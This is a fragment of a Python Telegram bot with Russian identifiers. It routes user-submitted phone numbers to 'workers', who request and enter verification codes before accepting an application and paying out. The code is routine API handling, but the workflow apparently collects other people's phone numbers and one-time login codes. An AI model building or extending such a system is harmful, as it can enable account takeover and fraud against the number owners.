def отправить(куда, текст, клава=None, заменить=False):
    """Отправка или редактирование сообщения"""
    if заменить and куда in активные_сообщения:
        # Редактируем существующее сообщение
        msg_id = активные_сообщения[куда]
        данные = {"chat_id": куда, "message_id": msg_id, "text": текст}
        if клава: данные["reply_markup"] = json.dumps(клава)
        ответ = requests.post(URL + "editMessageText", data=данные)
        if ответ.status_code == 200:
            return
    # Отправляем новое
    данные = {"chat_id": куда, "text": текст}
    if клава: данные["reply_markup"] = json.dumps(клава)
    ответ = requests.post(URL + "sendMessage", data=данные)
    if ответ.status_code == 200:
        данные_ответа = ответ.json()
        if "result" in данные_ответа:
            активные_сообщения[куда] = данные_ответа["result"]["message_id"]

def кнопки_заявки(ид, статус):
    """Кнопки для заявки в зависимости от статуса"""
    таблица = {
        "новая": [[{"text":"🔑 Запросить код","callback_data":f"взять_{ид}"}]],
        "код_запрошен": [[{"text":"📝 Ввести код","callback_data":f"код_{ид}"}]],
        "код_получен": [[{"text":"✅ Принять","callback_data":f"принять_{ид}"},{"text":"❌ Отклонить","callback_data":f"отказ_{ид}"}]],
        "холд": [[{"text":"💸 Выплатить","callback_data":f"платить_{ид}"}]]
    }
    return {"inline_keyboard": таблица.get(статус, [])}

def кнопки_воркеру(ид):
    """Кнопка для воркера, который взял заявку"""
    return {"inline_keyboard": [[{"text":"📝 Ввести код","callback_data":f"код_{ид}"}]]}

def кнопки_админу():
    return {"keyboard": [[{"text":"📋 Все заявки"}],[{"text":"👥 Воркеры"}],[{"text":"💰 Статистика"}]],"resize_keyboard":True}

def кнопки_пользователю():
    return {"keyboard": [[{"text":"📝 Новая заявка"}],[{"text":"📋 Мои заявки"}]],"resize_keyboard":True}

def уведомить_воркеров(тикет):
    """Отправляем заявку всем свободным воркерам"""
    свободные = [wid for wid, w in воркеры.items() if w.get("status") == "free"]
    for wid in свободные:
        отправить(wid, f"🆕 НОВАЯ ЗАЯВКА #{тикет}\n📞 {заявки[тикет]['phone']}\nНажми чтобы взять:", кнопки_заявки(тикет, "новая"))

